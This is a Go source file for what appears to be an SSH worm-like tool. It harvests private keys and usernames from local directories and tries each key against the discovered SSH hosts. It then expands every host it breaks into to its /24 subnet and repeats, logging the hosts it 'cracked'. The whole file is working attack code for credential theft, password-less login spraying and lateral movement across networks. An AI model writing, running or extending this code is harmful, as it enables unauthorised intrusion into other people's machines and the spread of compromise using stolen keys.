package main

import (
	"errors"
	"fmt"
	netutils "github.com/akihiro/go-net-utils"
	"github.com/sirupsen/logrus"
	"go.uber.org/atomic"
	"golang.org/x/crypto/ssh"
	"net"
	"os"
	"runtime"
	"strings"
	"sync"
	"time"
	"github.com/ip-rw/sshpider/pkg/core"
	"github.com/ip-rw/sshpider/pkg/search"
	"github.com/ip-rw/sshpider/pkg/sshutil"
	"github.com/ip-rw/sshpider/pkg/structs"
)

func main() {
	logrus.SetLevel(logrus.DebugLevel)
	runtime.GOMAXPROCS(runtime.NumCPU() - 1)
	dirs := os.Args[1:]
	users := search.GetUsers()
	allUsers := map[string]int{}
	for _, u := range users {
		allUsers[u] = 1
	}
	logrus.WithField("users", users).WithField("dirs", dirs).Info("found")
	result := core.Scan(dirs)
	seen := &sync.Map{}
	for _, t := range result.Hosts {
		if t.User != "" {
			if _, ok := allUsers[t.User]; !ok {
				allUsers[t.User] = 1
			} else {
				allUsers[t.User] += 1
			}
		}
	}
	for _, t := range result.PrivateKeys {
		if _, ok := allUsers[t.Owner]; !ok {
			allUsers[t.Owner] = 1
		} else {
			allUsers[t.Owner] += 1
		}
	}

	checkHosts(result, seen, allUsers)
	good := check(result)

	nets := map[*net.IPNet]bool{}
	prefixes := []net.IPNet{}

	l := 0
	for l != len(good) {
		logrus.WithField("new", len(good)-l).Warn("cracked more hosts")
		l = len(good)
		for _, g := range good {
			_, ipn, err := net.ParseCIDR(g.Ip + "/24")
			if err != nil {
				continue
			}
			if _, ok := nets[ipn]; !ok {
				nets[ipn] = true
				prefixes = append(prefixes, *ipn)
			}

			fmt.Println(g.String())
		}
		agg := netutils.Aggregate(prefixes)
		for _, ipn := range agg {
			for ip := range search.ExpandNetworkToChan(&net.IPNet{IP: ipn.IP, Mask: ipn.Mask}) {
				result.AddHost(structs.ParseHost(ip + ":22"))
			}
		}
		checkHosts(result, seen, allUsers)
		good = check(result)
	}
	logrus.Info("done")
}

var attempted = &sync.Map{}

func check(result *structs.ScanResults) []*structs.Target {
	var sem = make(chan int, 25)
	var wg = &sync.WaitGroup{}

	var good []*structs.Target
	found := &sync.Map{}
	attempts := &atomic.Uint64{}
	result.Targets.Range(func(key, value interface{}) bool {
		target := value.(*structs.Target)
		wg.Add(1)
		sem <- 1
		go func(t *structs.Target) {
			defer func() {
				wg.Done()
				<-sem
			}()
			if n := attempts.Inc(); n%1000 == 0 {
				logrus.WithField("attempts", n).Debug("progress")
			}
			if _, done := attempted.Load(fmt.Sprintf("%s@%s:%s:%s", t.User, t.Ip, t.Port, t.Key)); done {
				return
			}
			_, done := attempted.Load(fmt.Sprintf("%s@%s:%s:%s", t.User, t.Ip, t.Port, t.Key))
			if _, solved := found.Load(fmt.Sprintf("%s@%s:%s", t.User, t.Ip, t.Port)); !solved || !done {
				if valid, _ := sshutil.TestSSHLogin(t); valid {
					found.Store(fmt.Sprintf("%s@%s:%s", t.User, t.Ip, t.Port), 1)
					logrus.WithField("target", t).Info("valid")
					good = append(good, t)
				} else {
					if n := attempts.Inc(); n%10 == 0 {
						logrus.WithField("target", fmt.Sprintf("%s@%s:%d %s", t.User, t.Ip, t.Port, target.Key.Path)).Debugf("invalid #%d", attempts.Load())
					}
				}
			} else {
				logrus.WithField("target", fmt.Sprintf("%s@%s:%d %s", t.User, t.Ip, t.Port, target.Key.Path)).Debugf("duplicate")
			}

		}(target)
		return true
	})
	wg.Wait()
	return good
}

func checkHosts(result *structs.ScanResults, seen *sync.Map, allUsers map[string]int) {
	var sem = make(chan int, 150)
	var wg = &sync.WaitGroup{}
	for _, t := range result.Hosts {
		wg.Add(1)
		sem <- 1

		go func(host *structs.Host) {
			defer func() {
				wg.Done()
				<-sem
			}()
			k, err := sshutil.GetPublicKey(host.String(), time.Second*5)
			if err != nil || k == nil {
				if err == nil {
					err = errors.New("invalid key")
				}
				//logger.Log.WithError(err).Error("error getting hostkey")
				return
			}
			key := string(ssh.MarshalAuthorizedKey(k))
			if h, loaded := seen.LoadOrStore(key, host); !loaded {
				logrus.WithFields(logrus.Fields{"key": key, "host": host.String()}).Info("confirmed host")
				for u := range allUsers {
					var out bool
					for _, v := range []string{"git", "example", "gnu", "openssh", "antirez", "company.com", "@mindrot.com"} {
						if strings.Contains(host.String(), v) || u == v {
							out = true
							break
						}
					}
					if out {
						 continue
					}
					for _, pk := range result.PrivateKeys {
						if !strings.Contains(pk.Path, "cert") && !strings.Contains(pk.Path, ".cargo") {
							t := &structs.Target{
								User: u,
								Ip:   host.Ip,
								Port: int(host.Port),
								Key:  pk,
							}
							result.Targets.LoadOrStore(t.String(), t)
						}
					}
				}
			} else {
				logrus.WithFields(logrus.Fields{"host": host.String(), "existing_host": h.(*structs.Host).String()}).Debug("duplicate host")
			}
		}(t)
	}
	wg.Wait()
}
